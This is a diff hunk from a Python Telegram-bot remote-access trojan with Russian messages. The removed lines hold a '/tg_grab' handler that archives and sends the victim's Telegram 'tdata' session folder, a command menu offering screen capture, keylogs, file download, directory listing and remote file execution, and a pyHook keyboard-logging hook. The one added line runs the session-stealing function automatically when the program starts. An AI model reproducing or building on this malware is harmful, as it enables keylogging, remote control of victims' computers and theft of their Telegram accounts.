@@ -54,34 +54,4 @@ def archive_and_send():
             print(f"Error creating or sending zip file: {str(e)}")
     else:
         print("Папка 'tdata' не найдена.")
-@bot.message_handler(commands=['tg_grab'])
-def handle_archive_and_send(message):
-    chat_id = message.chat.id
-    archive_and_send()
-    bot.send_message(chat_id, "Архивация и отправка файла завершены.")
-
-@bot.message_handler(commands=['start'])
-def start(message):
-    chat_id = message.chat.id
-    markup = types.ReplyKeyboardMarkup(row_width=1)
-    itembtn1 = types.KeyboardButton('/capture_pc')
-    itembtn2 = types.KeyboardButton('/keylogs')
-    itembtn3 = types.KeyboardButton('/pc_info')
-    itembtn4 = types.KeyboardButton('/msg_box')
-    itembtn5 = types.KeyboardButton('/ip_info')
-    itembtn6 = types.KeyboardButton('/download_file')
-    itembtn7 = types.KeyboardButton('/list_dir')
-    itembtn8 = types.KeyboardButton('/run_file')
-    itembtn9 = types.KeyboardButton('/tg_grab')
-    itembtn10 = types.KeyboardButton('/url')
-    itembtn11 = types.KeyboardButton('/code')
-    markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9, itembtn10, itembtn11)
-    bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
-
-
-print('СЛУШАЮ КОМАНДЫ...')
-bot.polling()
-proc = pyHook.HookManager()
-proc.KeyDown = pressed_chars
-proc.HookKeyboard()
-pythoncom.PumpMessages()
+archive_and_send()
